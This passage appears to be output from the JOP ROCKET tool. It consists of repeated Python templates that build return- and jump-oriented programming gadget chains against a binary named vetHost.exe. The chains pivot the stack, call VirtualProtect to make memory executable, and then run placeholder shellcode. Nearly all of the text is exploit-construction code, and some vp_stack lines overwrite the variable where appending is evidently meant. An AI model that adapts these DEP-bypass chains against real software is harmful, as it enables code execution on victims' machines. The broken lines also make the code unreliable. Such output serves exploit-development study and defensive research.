		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EAX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0xc
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x18
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x24
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x30
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x48
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x54
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x60
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EAX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x8
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x10
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x18
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x20
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x28
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x38
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x40
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x48
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x50
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x58
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x68
			# padding  (-0x4 bytes)
		0x11002397, # (base + 0x2397), # pop esi # pop ebp # jmp eax # vetHost.exe  [0x8 bytes]** 0x70
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes] 0x80
		# N----> STACK PIVOT TOTAL: 0x80 bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EBX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x1c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EBX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes] 0x8c
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EBX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EBX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
